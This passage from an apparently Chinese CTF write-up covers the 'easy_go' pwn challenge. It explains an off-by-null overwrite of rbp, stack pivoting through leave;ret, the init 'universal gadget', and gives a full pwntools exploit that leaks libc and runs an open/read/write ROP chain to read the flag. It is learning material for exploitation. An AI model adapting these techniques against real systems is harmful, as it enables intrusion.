[rbp-2Ch]</span></span><br><span class="line">  __int16 v71; <span class="comment">// [rsp+98h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v72; <span class="comment">// [rsp+9Ah] [rbp-26h]</span></span><br><span class="line">  <span class="keyword">char</span> v73; <span class="comment">// [rsp+9Bh] [rbp-25h]</span></span><br><span class="line">  <span class="keyword">int</span> v74; <span class="comment">// [rsp+9Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v75; <span class="comment">// [rsp+A0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v76; <span class="comment">// [rsp+A2h] [rbp-1Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v77; <span class="comment">// [rsp+A3h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v78; <span class="comment">// [rsp+A4h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v79; <span class="comment">// [rsp+A8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v80; <span class="comment">// [rsp+AAh] [rbp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v81; <span class="comment">// [rsp+ABh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v82; <span class="comment">// [rsp+ACh] [rbp-14h]</span></span><br><span class="line">  __int16 v83; <span class="comment">// [rsp+B0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v84; <span class="comment">// [rsp+B2h] [rbp-Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v85; <span class="comment">// [rsp+B3h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v86; <span class="comment">// [rsp+B4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">32</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">4</span>;</span><br><span class="line">  v7 = <span class="number">21</span>;</span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">-1073741762</span>;</span><br><span class="line">  v11 = <span class="number">6</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">32</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  v19 = <span class="number">21</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  v21 = <span class="number">1</span>;</span><br><span class="line">  v22 = <span class="number">15</span>;</span><br><span class="line">  v23 = <span class="number">6</span>;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">2147418112</span>;</span><br><span class="line">  v27 = <span class="number">21</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">1</span>;</span><br><span class="line">  v30 = <span class="number">231</span>;</span><br><span class="line">  v31 = <span class="number">6</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">2147418112</span>;</span><br><span class="line">  v35 = <span class="number">21</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  v37 = <span class="number">1</span>;</span><br><span class="line">  v38 = <span class="number">60</span>;</span><br><span class="line">  v39 = <span class="number">6</span>;</span><br><span class="line">  v40 = <span class="number">0</span>;</span><br><span class="line">  v41 = <span class="number">0</span>;</span><br><span class="line">  v42 = <span class="number">2147418112</span>;</span><br><span class="line">  v43 = <span class="number">21</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">1</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">6</span>;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v49 = <span class="number">0</span>;</span><br><span class="line">  v50 = <span class="number">2147418112</span>;</span><br><span class="line">  v51 = <span class="number">21</span>;</span><br><span class="line">  v52 = <span class="number">0</span>;</span><br><span class="line">  v53 = <span class="number">1</span>;</span><br><span class="line">  v54 = <span class="number">1</span>;</span><br><span class="line">  v55 = <span class="number">6</span>;</span><br><span class="line">  v56 = <span class="number">0</span>;</span><br><span class="line">  v57 = <span class="number">0</span>;</span><br><span class="line">  v58 = <span class="number">2147418112</span>;</span><br><span class="line">  v59 = <span class="number">21</span>;</span><br><span class="line">  v60 = <span class="number">0</span>;</span><br><span class="line">  v61 = <span class="number">1</span>;</span><br><span class="line">  v62 = <span class="number">2</span>;</span><br><span class="line">  v63 = <span class="number">6</span>;</span><br><span class="line">  v64 = <span class="number">0</span>;</span><br><span class="line">  v65 = <span class="number">0</span>;</span><br><span class="line">  v66 = <span class="number">2147418112</span>;</span><br><span class="line">  v67 = <span class="number">21</span>;</span><br><span class="line">  v68 = <span class="number">0</span>;</span><br><span class="line">  v69 = <span class="number">1</span>;</span><br><span class="line">  v70 = <span class="number">257</span>;</span><br><span class="line">  v71 = <span class="number">6</span>;</span><br><span class="line">  v72 = <span class="number">0</span>;</span><br><span class="line">  v73 = <span class="number">0</span>;</span><br><span class="line">  v74 = <span class="number">2147418112</span>;</span><br><span class="line">  v75 = <span class="number">21</span>;</span><br><span class="line">  v76 = <span class="number">0</span>;</span><br><span class="line">  v77 = <span class="number">1</span>;</span><br><span class="line">  v78 = <span class="number">12</span>;</span><br><span class="line">  v79 = <span class="number">6</span>;</span><br><span class="line">  v80 = <span class="number">0</span>;</span><br><span class="line">  v81 = <span class="number">0</span>;</span><br><span class="line">  v82 = <span class="number">2147418112</span>;</span><br><span class="line">  v83 = <span class="number">6</span>;</span><br><span class="line">  v84 = <span class="number">0</span>;</span><br><span class="line">  v85 = <span class="number">0</span>;</span><br><span class="line">  v86 = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">21</span>;</span><br><span class="line">  v2 = &amp;v3;</span><br><span class="line">  <span class="keyword">if</span> ( prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    perror(<span class="string">&quot;prctl(SECCOMP)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *__errno_location() == <span class="number">22</span> )</span><br><span class="line">    perror(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="沙箱seccomp-tools"><a href="#沙箱seccomp-tools" class="headerlink" title="沙箱seccomp-tools"></a>沙箱seccomp-tools</h4><p>这是一个沙箱seccomp-tools查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Desktop % seccomp-tools dump ./easy_go</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0020: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>可以看到execve系统函数被禁用了,也就是说system函数没法用,这里用orw实现读flag的操作</p>
<p>sub_4016CF()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_4016CF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = cli_send() ^ <span class="number">1</span>;                    <span class="comment">// 如果a只有0和1的话，a ^ 1 = 1 - a,</span></span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;continue?(0:no, 1:yes): &quot;</span>);</span><br><span class="line">    result = continue_receive();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( result );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cli_send()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_int64 <span class="title">sub_401664</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;client send &gt;&gt; &quot;</span>);</span><br><span class="line">  readstr(s1, <span class="number">16LL</span>); <span class="comment">//注意这里的s1的大小16位,s1[0],s1[15]</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;exit&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;server back &lt;&lt; %s\n&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>readstr()</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_4015AB</span><span class="params">(__int64 str, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; n; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, (i + str), <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + str) == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(i + str) = <span class="number">0</span>; <span class="comment">//整个程序唯一的溢出在这里,溢出了一个字节为0,能够覆盖掉rbp的最后一个字节</span></span><br><span class="line">          <span class="comment">//在前面16位读满了以后,i=16,读入上一个函数的参数s1处,即s1[16]=0,这里s1后面就是rbp,即把rbp的最后一个字节置零了</span></span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个是关键函数,注意它的两个参数,第一个参数是一个地址,表示写入的buf,第二个参数是写入的长度</p>
<p>我们可以劫持rbp指向输入的地方利用leave,ret劫持返回地址,注意这里leave以后rip会加8,所以返回地址应该在0x08的位置(因为栈的位置开启了随机,但是最后两位因为爆破的原因不变,这里用最后两位直接表示栈的地址)</p>
<p><img src="E:\Blog\source_posts\刷题记录-0x1\easy_go.png" alt="easy_go"></p>
<p>利用</p>
<ul>
<li>leave_ret<ul>
<li>readstr读完了以后会有一个leave_ret  </li>
<li>在cli_send中调用完readstr以后也有一个leave_ret</li>
<li>在cli_send的上层函数sub_4016CF中也有一个leave_ret</li>
</ul>
</li>
<li>三个leave_ret就可以劫持rsp了,需要注意的是这三个leave_ret需要一定的条件,可以看到在sub_4016CF中,有一个对result即clisend函数返回值判断的循环,我们需要让返回值等于0,来跳出循环,即在cli_send中让接收到的str为exit,程序判断会自动跳出循环</li>
<li>当然也可以用continue_receive的结果来跳出循环,权衡了跳出循环后各个寄存器的值,我们劫持了rbp以后,只能写入一条返回地址,也就是说只能执行一个函数,因此这个函数必须带有读入功能,这样的话题目中的readstr函数是一个不错的选择,我们发现用exit跳出的时候,rdi寄存器是一个栈地址指向刚刚0x…00的位置,rsi寄存器是一个很大的数,用readstr函数的话可以读入足够的长度</li>
<li>这里也有两种选择<ul>
<li>可以返回到call readstr函数的地方,这样的话原本0x08的位置,call进去rsp变成0x00,然后保存,注意此时rbp为0x00,最后leave_ret的地址还是0x08,我们读入的地址是0x00,需要0x8的填充物</li>
<li>如果返回到readstr的第一句我们的rsp为0x08保存给了rbp,但是读入的地址是0x00,因为函数的局部变量存贮在栈上,通过rbp进行索引调用,在调试过后发现,readstr的循环变量存储在rbp-0x4的位置,这里也就是0x04的位置,这样的话我们读入的时候会覆盖掉原本的循环变量,会出错,call进去的话因为rsp前移了0x8就不会有这个问题</li>
</ul>
</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&quot;./easy_go&quot;</span></span><br><span class="line">context(binary=file_path, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">glibc_version = <span class="string">&#x27;2.27&#x27;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(ip, 8704)</span></span><br><span class="line">p = process(file_path)</span><br><span class="line"></span><br><span class="line">target_address = <span class="number">0x000000000040168d</span></span><br><span class="line">read_plt = <span class="number">0x00000000004015E1</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi_ret = <span class="number">0x00000000004017a3</span></span><br><span class="line">rsi_r15_ret = <span class="number">0x00000000004017a1</span></span><br><span class="line">ret = <span class="number">0x00000000004017A4</span></span><br><span class="line">bss = <span class="number">0x404a00</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004016CD</span></span><br><span class="line">rbp_r12_r13_r14_r15 = <span class="number">0x000000000040179B</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############## orw ##############</span></span><br><span class="line">flag_file = <span class="string">&#x27;flag\x00&#x27;</span></span><br><span class="line">flag_size = <span class="number">0x30</span></span><br><span class="line">flag_addr = bss + <span class="number">0x100</span></span><br><span class="line"><span class="comment"># open(file,0,0)</span></span><br><span class="line"><span class="comment"># read(3,file,flag_size)</span></span><br><span class="line"><span class="comment"># write(1,file,flag_size)</span></span><br><span class="line"><span class="comment">#################################</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">########### init gadget ##########</span></span><br><span class="line">init_function1 = <span class="number">0x0000000000401796</span></span><br><span class="line">init_function2 = <span class="number">0x0000000000401780</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_gadget</span>(<span class="params">begin,end,a1,a2,a3,ret_address</span>):</span></span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(begin) + p64(end) </span><br><span class="line">    payload += p64(a1) + p64(a2) + p64(a3)</span><br><span class="line">    payload += p64(ret_address)</span><br><span class="line">    payload += p64(init_function2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="comment">##################################</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;exit&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;aaa&#x27;</span> + p64(target_address) <span class="comment"># 第一次读入即劫持rbp,这里的target_addr就是call readstr的地址,注意exit后面加上\x00,在后面判断的时候,利用str的特性截断判断,直接退出</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;client send &gt;&gt; &quot;</span>) <span class="comment"># 写recvuntil是一个好习惯</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment"># 有了读写任意长度以后,开始构造rop链,老样子栈上泄露libc,然后写到bss段执行</span></span><br><span class="line"><span class="comment"># 这里data段从0x404000开始到0x405000结束,这里bss段选择了一个比较后面的位置0x404a00  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(rdi_ret) + p64(puts_got) + p64(puts_plt) <span class="comment"># 泄露libc地址,因为程序没有write,这里用了puts</span></span><br><span class="line">payload += p64(init_function1) <span class="comment"># 这里利用了万能gadget,在init函数里面,注意的地方比较多</span></span><br><span class="line">payload += init_gadget(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,flag_addr,<span class="number">0x6</span>,read_got) <span class="comment"># 首先读入flag文件地址,过会orw的时候要用</span></span><br><span class="line">payload += init_gadget(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,bss,<span class="number">0x100</span>,read_got) <span class="comment"># 在bss段预先设置好rop</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x4049f8</span>) + p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment"># 利用万能gadget设置rbp</span></span><br><span class="line">payload += p64(leave_ret) <span class="comment"># leave_ret 跳转</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_libc = u64(p.recv(<span class="number">6</span>) + <span class="string">&quot;\x00\x00&quot;</span>)</span><br><span class="line">libc_base = puts_libc - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">open_libc = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_libc = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_libc = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(open_libc))</span><br><span class="line"></span><br><span class="line">p.sendline(flag_file)</span><br><span class="line">libc_rdi = <span class="number">0x00000000000215bf</span> + libc_base</span><br><span class="line">libc_rsi = <span class="number">0x0000000000023eea</span> + libc_base</span><br><span class="line">libc_rdx = <span class="number">0x0000000000001b96</span> + libc_base</span><br><span class="line"><span class="comment"># open(file,0,0)</span></span><br><span class="line"><span class="comment"># read(3,file,flag_size)</span></span><br><span class="line"><span class="comment"># write(1,file,flag_size)</span></span><br><span class="line"></span><br><span class="line">payload = p64(libc_rdi) + p64(flag_addr) <span class="comment"># flag_addr = bss + 0x100 &#x27;./flag&#x27;</span></span><br><span class="line">payload += p64(libc_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc_rdx) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_libc)</span><br><span class="line">payload += p64(libc_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(libc_rsi) + p64(flag_addr)</span><br><span class="line">payload += p64(libc_rdx) + p64(flag_size)</span><br><span class="line">payload += p64(read_libc)</span><br><span class="line">payload += p64(libc_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(libc_rsi) + p64(flag_addr)</span><br><span class="line">payload += p64(libc_rdx) + p64(flag_size)</span><br><span class="line">payload += p64(write_libc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;break *0x401623&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>注意点</p>
<ul>
<li><p>c语言string的判断,在字符串后面读到<code>\x00</code>就结束,我们写入buf的时候可以在<code>\x00</code>后面继续写入</p>
</li>
<li><p>recvuntil是一个好习惯</p>
</li>
<li><p>这里bss段后面跟了一个extern这个奇怪的东西,为了防止读写出错,选择较靠后的位置0x404a00,注意bss段到0x405000都可以利用,空间足够</p>
<p>![easy_go bss](E:\Blog\source_posts\刷题记录-0x1\easy_go bss.png)</p>
</li>
</ul>
</li>
</ul>
<h4 id="init-万能gadget"><a href="#init-万能gadget" class="headerlink" title="init 万能gadget"></a>init 万能gadget</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">loc_401780:</span><br><span class="line">mov     rdx, r14</span><br><span class="line">mov     rsi, r13</span><br><span class="line">mov     edi, r12d</span><br><span class="line">call    ds:(funcs_401789 - 403D80h)[r15+rbx*8]</span><br><span class="line">add     rbx, 1</span><br><span class="line">cmp     rbp, rbx</span><br><span class="line">jnz     short loc_401780 </span><br><span class="line"></span><br><span class="line">loc_401796:</span><br><span class="line">add     rsp, 8</span><br><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">pop     r15</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 401740</span><br><span class="line">init endp</span><br></pre></td></tr></table></figure>

<ul>
<li>利用方法: 首先用loc_401796函数(这里称为init_function1)设置参数,然后ret的时候跳转到loc_401780(这里称为init_function2)<ul>
<li>rbx和rbp: init_function2执行rbp-rbx次也就是循环变量rbx和循环终止值rbp,注意这里rbx会影响到init_function2跳转的地址,一般设置为0</li>
<li>r12,r13,r14对应edi,rsi,rdx,即三个参数</li>
<li>r15为call的地址(注意配合rbx = 0食用)</li>
</ul>
</li>
<li>注意点1:在传参的时候,init_function1中有一个add rsp,8,这一句也会影响到栈,相当于pop了一个东西,所以写rop的时候要<strong>多设置一个参数来填充</strong>这一句</li>
<li>注意点2:<strong>init_function2函数call完了以后没有ret!</strong>,会再执行一遍init_function1注意ret地址的设置</li>
<li>注意点3,可以通过init_function1来跳转到目标地址开始执行rop,只需要设置rbp的值,然后其他参数等于零,返回地址为leave_ret,这样就相当于直接改rbp做了一次栈迁移,注意ret的时候rsp会加0x8所以<strong>rbp要写目标地址-0x8的位置</strong></li>
</ul>
<h4 id="orw注意事项"><a href="#orw注意事项" class="headerlink" title="orw注意事项"></a>orw注意事项</h4><ul>
<li>使用方法<ul>
<li>open(file,0,0)</li>
<li>read(3,file,flag_size)</li>
<li>write(1,file,flag_size)</li>
</ul>
</li>
<li>注意:<ul>
<li>open的file参数是文件打开的地址,<strong>file需要事先读入bss段</strong>,然后取bss的地址来使用</li>
<li><strong>flag的地址记得加<code>\x00</code></strong>, 地址可以使用相对位置<ul>
<li>例: <code>./flag\x00</code>,这里直接使用了<code>flag\x00</code></li>
</ul>
</li>
<li>read的第一个参数为3:读取当前打开的文件,第二个参数同open的第一个参数</li>
</ul>
</li>
</ul>
<h3 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h3><blockquote>
<p>格式化字符串,修改got表,32位</p>
</blockquote>
<p>checksec</p>
